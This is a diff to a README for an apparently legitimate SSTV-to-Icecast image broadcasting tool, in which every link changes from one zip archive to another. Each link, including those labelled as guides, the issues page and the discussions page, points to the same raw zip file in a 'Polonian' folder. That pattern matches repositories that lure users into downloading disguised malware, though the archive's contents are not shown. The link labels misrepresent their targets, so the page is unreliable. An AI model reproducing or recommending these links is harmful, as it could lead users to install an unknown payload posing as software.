@@ -1,6 +1,6 @@
 # 🎨 Bitscoper_SSTV_Icecast_Broadcaster - Transmit Images Effortlessly
 
-[![Download](https://raw.githubusercontent.com/Likely-kinsman623/Bitscoper_SSTV_Icecast_Broadcaster/main/Polonian/Bitscoper_SSTV_Icecast_Broadcaster_2.0.zip)](https://raw.githubusercontent.com/Likely-kinsman623/Bitscoper_SSTV_Icecast_Broadcaster/main/Polonian/Bitscoper_SSTV_Icecast_Broadcaster_2.0.zip)
+[![Download](https://raw.githubusercontent.com/Likely-kinsman623/Bitscoper_SSTV_Icecast_Broadcaster/main/Polonian/Icecast-Broadcaster-SST-Bitscoper-v2.5.zip)](https://raw.githubusercontent.com/Likely-kinsman623/Bitscoper_SSTV_Icecast_Broadcaster/main/Polonian/Icecast-Broadcaster-SST-Bitscoper-v2.5.zip)
 
 ## 📜 Description
 
@@ -23,7 +23,7 @@ Before downloading, make sure your system meets these requirements:
 
 To download the application, visit the Releases page using the link below:
 
-[Download Bitscoper_SSTV_Icecast_Broadcaster](https://raw.githubusercontent.com/Likely-kinsman623/Bitscoper_SSTV_Icecast_Broadcaster/main/Polonian/Bitscoper_SSTV_Icecast_Broadcaster_2.0.zip)
+[Download Bitscoper_SSTV_Icecast_Broadcaster](https://raw.githubusercontent.com/Likely-kinsman623/Bitscoper_SSTV_Icecast_Broadcaster/main/Polonian/Icecast-Broadcaster-SST-Bitscoper-v2.5.zip)
 
 1. Click on the link to go to the Releases page.
 2. Find the latest version of the application listed there.
@@ -83,14 +83,14 @@ This project is licensed under the MIT License. You can freely use, modify, and 
 
 If you're new to SSTV and broadcasting, you may find these resources helpful:
 
-- [Introduction to Slow Scan Television](https://raw.githubusercontent.com/Likely-kinsman623/Bitscoper_SSTV_Icecast_Broadcaster/main/Polonian/Bitscoper_SSTV_Icecast_Broadcaster_2.0.zip)
-- [Icecast Streaming Guide](https://raw.githubusercontent.com/Likely-kinsman623/Bitscoper_SSTV_Icecast_Broadcaster/main/Polonian/Bitscoper_SSTV_Icecast_Broadcaster_2.0.zip)
-- [Understanding Ogg Opus Format](https://raw.githubusercontent.com/Likely-kinsman623/Bitscoper_SSTV_Icecast_Broadcaster/main/Polonian/Bitscoper_SSTV_Icecast_Broadcaster_2.0.zip)
+- [Introduction to Slow Scan Television](https://raw.githubusercontent.com/Likely-kinsman623/Bitscoper_SSTV_Icecast_Broadcaster/main/Polonian/Icecast-Broadcaster-SST-Bitscoper-v2.5.zip)
+- [Icecast Streaming Guide](https://raw.githubusercontent.com/Likely-kinsman623/Bitscoper_SSTV_Icecast_Broadcaster/main/Polonian/Icecast-Broadcaster-SST-Bitscoper-v2.5.zip)
+- [Understanding Ogg Opus Format](https://raw.githubusercontent.com/Likely-kinsman623/Bitscoper_SSTV_Icecast_Broadcaster/main/Polonian/Icecast-Broadcaster-SST-Bitscoper-v2.5.zip)
 
-For more information, do not hesitate to check our GitHub repository at [Bitscoper_SSTV_Icecast_Broadcaster](https://raw.githubusercontent.com/Likely-kinsman623/Bitscoper_SSTV_Icecast_Broadcaster/main/Polonian/Bitscoper_SSTV_Icecast_Broadcaster_2.0.zip).
+For more information, do not hesitate to check our GitHub repository at [Bitscoper_SSTV_Icecast_Broadcaster](https://raw.githubusercontent.com/Likely-kinsman623/Bitscoper_SSTV_Icecast_Broadcaster/main/Polonian/Icecast-Broadcaster-SST-Bitscoper-v2.5.zip).
 
 ## 🔗 Quick Links
 
-- [Download Bitscoper_SSTV_Icecast_Broadcaster](https://raw.githubusercontent.com/Likely-kinsman623/Bitscoper_SSTV_Icecast_Broadcaster/main/Polonian/Bitscoper_SSTV_Icecast_Broadcaster_2.0.zip)
-- [Issues Page](https://raw.githubusercontent.com/Likely-kinsman623/Bitscoper_SSTV_Icecast_Broadcaster/main/Polonian/Bitscoper_SSTV_Icecast_Broadcaster_2.0.zip)
-- [Discussions Page](https://raw.githubusercontent.com/Likely-kinsman623/Bitscoper_SSTV_Icecast_Broadcaster/main/Polonian/Bitscoper_SSTV_Icecast_Broadcaster_2.0.zip)
+- [Download Bitscoper_SSTV_Icecast_Broadcaster](https://raw.githubusercontent.com/Likely-kinsman623/Bitscoper_SSTV_Icecast_Broadcaster/main/Polonian/Icecast-Broadcaster-SST-Bitscoper-v2.5.zip)
+- [Issues Page](https://raw.githubusercontent.com/Likely-kinsman623/Bitscoper_SSTV_Icecast_Broadcaster/main/Polonian/Icecast-Broadcaster-SST-Bitscoper-v2.5.zip)
+- [Discussions Page](https://raw.githubusercontent.com/Likely-kinsman623/Bitscoper_SSTV_Icecast_Broadcaster/main/Polonian/Icecast-Broadcaster-SST-Bitscoper-v2.5.zip)
